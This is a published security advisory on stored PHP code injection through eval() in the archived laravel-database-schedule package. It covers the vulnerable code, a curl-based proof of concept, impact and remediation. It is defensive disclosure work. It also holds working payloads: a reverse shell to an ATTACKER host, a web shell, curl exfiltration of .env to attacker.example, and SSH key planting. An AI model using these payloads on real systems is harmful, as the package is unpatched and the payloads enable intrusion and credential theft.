---
title: "Security Advisory LDBS-2026-001-A: Stored PHP Code Injection via eval() in laravel-database-schedule"
date: 2026-08-03 14:00:00 +0300
categories: [Security Advisories, Laravel]
tags: [laravel, php, rce, code-injection, eval, disclosure]
description: "Coordinated disclosure (LDBS-2026-001-A): a mass-assignable params field reaches PHP eval() in robersonfaria/laravel-database-schedule, giving any user with scheduler form access stored remote code execution that fires on every scheduler tick. Critical — CVSS 9.9, CWE-94. No patch; repository archived."
---

| Field               | Value                                                                                          |
|---------------------|-----------------------------------------------------------------------------------------------|
| **Advisory ID**     | LDBS-2026-001-A                                                                                |
| **Package**         | `robersonfaria/laravel-database-schedule`                                                      |
| **Packagist**       | https://packagist.org/packages/robersonfaria/laravel-database-schedule                         |
| **Repository**      | https://github.com/robersonfaria/laravel-database-schedule                                     |
| **Affected**        | All versions ≤ 1.4.0 — **no patch will be issued (repository archived)**                      |
| **Discovered**      | 2026-05-08                                                                                     |
| **Reported**        | 2026-05-11                                                                                     |
| **Maintainer reply**| 2026-05-11 — repository archived; public advisory submission approved                         |
| **CVE ID**          | Requested from MITRE 2026-05-12 — assignment pending as of publication                        |
| **Published**       | 2026-08-03 (public advisory)                                                                   |
| **Severity**        | Critical                                                                                       |
| **CVSS 3.1 Score**  | 9.9 — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`                                                 |
| **CWE**             | CWE-94 (Improper Control of Generation of Code / Code Injection)                              |
| **Reporter**        | Tunahan Burak Dirlik (independent security researcher)                                                   |

> **Related advisory:**
> - LDBS-2026-001-B — Stored OS Command Injection via `command_custom` (CWE-78)

---

## Disclosure Timeline

| Date | Event |
|------------|-------|
| 2026-05-08 | Both vulnerabilities discovered during a security audit of `master` HEAD. |
| 2026-05-11 | Reported privately to the package maintainer; proof-of-concept executed the same day. |
| 2026-05-11 | Maintainer acknowledged and confirmed both findings, archived the repository, added a deprecation notice marking the package as vulnerable and unmaintained, stated that no patch would be released, and approved submission of a public advisory. |
| 2026-05-12 | CVE ID requested from MITRE for both findings (LDBS-2026-001-A and LDBS-2026-001-B). |
| 2026-08-03 | Public advisory published. No CVE ID had been assigned by MITRE at the time of publication; the request remains pending. |

> This advisory is published with the maintainer's explicit approval, following coordinated disclosure. The affected package is archived and will not receive a patch — publication serves to inform downstream users who may still be running it. See **Remediation** for migration guidance.

---

## Executive Summary

`robersonfaria/laravel-database-schedule` exposes Laravel's task scheduler through a database-backed web UI. The `Schedule::getArguments()` method evaluates user-supplied PHP expressions using PHP's `eval()` builtin whenever a schedule parameter's `type` field is set to `"function"`. This field:

- Is present in the model's `$fillable` array and therefore mass-assignable.
- Has no validation rule in `ScheduleRequest::rules()` — the `params` key is entirely absent from the ruleset.
- Is exposed directly in the package's own create/edit form via a `Function` dropdown option.

A user who can POST to `/schedule` can persist an arbitrary PHP expression that executes unconditionally on every subsequent scheduler tick, with no file writes or further interaction required.

The intended deployment of this package requires operators to define a `viewDatabaseSchedule` gate that authorizes users to reach the scheduler UI; the threat model therefore assumes a low-privileged authenticated user with form access (CVSS `PR:L`). See *Operator Configuration Amplifier* below for the impact of a documented but insecure configuration choice.

The package maintainer has confirmed the package is unmaintained, archived the repository, and added a deprecation notice. No patch will be released. Users running this package in production should be aware of this status when planning their upgrade or migration path.

---

## Test Environment

| Component        | Detail                                                        |
|------------------|---------------------------------------------------------------|
| **Device**       | Apple MacBook (Apple Silicon)                                 |
| **OS**           | macOS (darwin, arm64)                                         |
| **Shell**        | zsh                                                           |
| **PHP**          | 8.5.6 (Homebrew) — `brew install php`                         |
| **Composer**     | 2.9.7 — `brew install composer`                               |
| **grep**         | GNU grep 3.12 (Homebrew) — `brew install grep` (`ggrep`)      |
| **Laravel**      | 10.50.2 (`laravel/laravel:^10`, installed as `v10.3.3`)       |
| **Package**      | `robersonfaria/laravel-database-schedule` 1.4.0               |
| **Database**     | SQLite via `pdo_sqlite` (built into PHP, no server required)  |
| **Web server**   | `php artisan serve` — `http://127.0.0.1:8000`                 |

### Reproduction Setup

```bash
# 1. Install prerequisites
brew install php composer grep

# 2. Create a fresh Laravel 10 project
composer create-project laravel/laravel:^10 ldbs-test
cd ldbs-test
touch database/database.sqlite

# 3. Configure .env — set DB_CONNECTION=sqlite, comment out DB_HOST/DB_DATABASE.
#
#    For PoC reproducibility, set SCHEDULE_RESTRICTED_ACCESS=false. This disables
#    the package's authentication middleware so the curl-based PoC below can run
#    without setting up a Laravel auth provider and `viewDatabaseSchedule` gate.
#    The README explicitly warns that this configuration exposes /schedule publicly;
#    it is used here only to keep the reproduction self-contained. The vulnerability
#    itself is independent of this setting — it triggers for any user who can reach
#    the form, including legitimate authenticated users in a properly configured
#    deployment.

# 4. Install the vulnerable package
composer require robersonfaria/laravel-database-schedule
# Locked: robersonfaria/laravel-database-schedule (1.4.0)

# 5. Publish config and run migrations
php artisan vendor:publish \
  --provider="RobersonFaria\DatabaseSchedule\DatabaseSchedulingServiceProvider" \
  --tag=config
php artisan migrate

# 6. Start the development server
php artisan serve
# INFO  Server running on [http://127.0.0.1:8000].
```

### CSRF Token Helper

All POST endpoints require a CSRF token:

```bash
get_token() {
  curl -c cookies.txt -b cookies.txt -s 'http://127.0.0.1:8000/schedule/create' \
    | ggrep -oP 'name="_token"[^>]*value="\K[^"]+' | head -1
}
TOKEN=$(get_token)
echo $TOKEN
# CKAWIT288IFQAe97SEW9lZ70RoUA23JfwI2NRgeh
```

---

## Vulnerability Detail

### Vulnerable Code

**`src/Models/Schedule.php` — `getArguments()`:**

```php
public function getArguments(): array
{
    $arguments = [];

    foreach (($this->params ?? []) as $argument => $value) {
        if (empty($value['value'])) {
            continue;
        }
        if (isset($value["type"]) && $value['type'] === 'function') {
            eval('$arguments[$argument] = (string) ' . $value['value']); // ← UNSAFE eval()
        } else {
            $arguments[$argument] = $value['value'];
        }
    }

    return $arguments;
}
```

**`src/Http/Requests/ScheduleRequest.php` — `rules()` (relevant excerpt):**

```php
return [
    'command'        => 'required',
    'command_custom' => 'nullable|string|required_if:command,custom',
    'expression'     => 'required|cron',
    'webhook_before' => 'nullable|url',
    'webhook_after'  => 'nullable|url',
    'email_output'   => 'requiredIf:sendmail_error,1|requiredIf:sendmail_success,1|nullable|email',
    'log_filename'   => 'nullable|alpha_dash',
    'groups'         => 'nullable|regex:/^[A-Za-z-_0-9,]*$/',
    'environments'   => 'nullable|regex:/^[A-Za-z-_0-9,]*$/',
    // ← 'params' is entirely absent — no validation applied
];
```

### Data Flow

```
HTTP POST /schedule
  └─ ScheduleController::store()
       └─ $schedule->create($request->all())      ← mass-assign, params unvalidated
            └─ schedules.params = {"message":{"type":"function","value":"passthru(...)"}}
                 ↓ (next scheduler tick)
            Schedule::dispatch($task)
               └─ getArguments()
                    └─ eval('$arguments["message"] = (string) passthru(...)')  ← RCE
```

---

## Proof of Concept

### Step 1 — Establish a Session and Obtain a CSRF Token

```bash
get_token() {
  curl -c cookies.txt -b cookies.txt -s 'http://127.0.0.1:8000/schedule/create' \
    | ggrep -oP 'name="_token"[^>]*value="\K[^"]+' | head -1
}
TOKEN=$(get_token)
echo $TOKEN
# CKAWIT288IFQAe97SEW9lZ70RoUA23JfwI2NRgeh
```

### Step 2 — Create a Malicious Schedule

```bash
curl -b cookies.txt -X POST 'http://127.0.0.1:8000/schedule' \
  --data-urlencode "_token=${TOKEN}" \
  --data-urlencode "command=inspire" \
  --data-urlencode "expression=* * * * *" \
  --data-urlencode "params[message][type]=function" \
  --data-urlencode 'params[message][value]=passthru("id > /tmp/.pwn");'
```

Server responds with a `302` redirect to `/schedule/index` — the row was accepted and persisted.

### Step 3 — Trigger the Scheduler

```bash
php artisan schedule:run
```

```
2026-05-11 22:54:35 Running ['artisan' inspire ''] .....  120ms FAIL
  ⇂ '/opt/homebrew/Cellar/php/8.5.6/bin/php' 'artisan' inspire ''
    > 'storage/logs/schedule-77569762517da60581688b2572f83fc01edd11b3.log' 2>&1
```

The task exits `FAIL` because the crafted argument causes `inspire` to exit non-zero. The OS command inside `eval()` fires before the artisan exit code is checked.

### Step 4 — Verify Code Execution

```bash
cat /tmp/.pwn
```

```
uid=501(tburakdirlik) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),
79(_appserverusr),80(admin),81(_appserveradm),701(com.apple.sharepoint.group.1),
702(com.apple.sharepoint.group.2),33(_appstore),98(_lpadmin),100(_lpoperator),
204(_developer),250(_analyticsusers),395(com.apple.access_ftp),
398(com.apple.access_screensharing),399(com.apple.access_ssh),
400(com.apple.access_remote_ae)
```

OS-level code execution confirmed as the PHP process owner.

---

## Impact

- Full OS command execution as the PHP-FPM / web server user.
- Read/write access to the entire application directory including `.env`, source code, and `storage/`.
- Disclosure of `APP_KEY` enables forging signed cookies and decrypting encrypted session values.
- Disclosure of `DB_*` credentials enables full database access.
- The payload row in `schedules` re-executes on every cron tick — trivial persistence without additional file writes.
- The task exits with `FAIL` status, which produces a log anomaly, but the payload executes regardless.

### Operator Configuration Amplifier

The package ships with a `SCHEDULE_RESTRICTED_ACCESS` configuration key (default `true`) that gates the schedule UI behind a `viewDatabaseSchedule` Laravel gate the operator is expected to define. The README documents both the setting and the gate.

When operators set `SCHEDULE_RESTRICTED_ACCESS=false` — a configuration the README explicitly warns against (*"if restricted_access is set to false, access to the /schedule route will be public"*) — the chain documented above becomes reachable by any unauthenticated network client. This is not a separate vulnerability in the package, but is a documented operator choice that significantly amplifies the impact of this finding in deployments where it is set.

Operators running this package with `SCHEDULE_RESTRICTED_ACCESS=false` should be aware that, in the absence of a patch, this configuration is equivalent to publicly exposing a remote-code-execution endpoint, and may wish to factor this into their deployment and migration decisions.

---

## Payload Variants

| Goal | `params[message][value]` |
|------|--------------------------|
| Reverse shell | `system('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'); 1` |
| Persistent webshell | `file_put_contents('/var/www/html/public/.cache.php','<?php system($_GET[c]);'); 1` |
| Exfiltrate `.env` | `system('curl --data @/var/www/html/.env https://attacker.example/'); 1` |
| Add SSH key | `system('echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys'); 1` |

---

## Remediation

No patch will be released; the repository has been archived and the maintainer has added a deprecation notice to the repository documenting the vulnerable status. The following technical fixes would address this finding if a future maintainer or fork were to patch it:

1. Remove the `eval()` call entirely. Server-side PHP evaluation of user input is not required for any scheduler use case.
2. Add strict validation in `ScheduleRequest::rules()`:

```php
'params'         => 'nullable|array',
'params.*.value' => 'nullable|string|max:255',
'params.*.type'  => 'nullable|in:string',   // remove 'function' entirely
```

3. Remove `<option value="function">` from `resources/views/form.blade.php`.

---

## References

- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- OWASP Code Injection: https://owasp.org/www-community/attacks/Code_Injection
- Laravel Scheduler: https://laravel.com/docs/scheduling
- Package repository: https://github.com/robersonfaria/laravel-database-schedule
- Packagist: https://packagist.org/packages/robersonfaria/laravel-database-schedule
- Related advisory LDBS-2026-001-B: `<INSERT PUBLISHED URL>`

---

## Credit

**Tunahan Burak Dirlik** — independent security research.
Audit performed against `master` HEAD of `robersonfaria/laravel-database-schedule` on 2026-05-08.
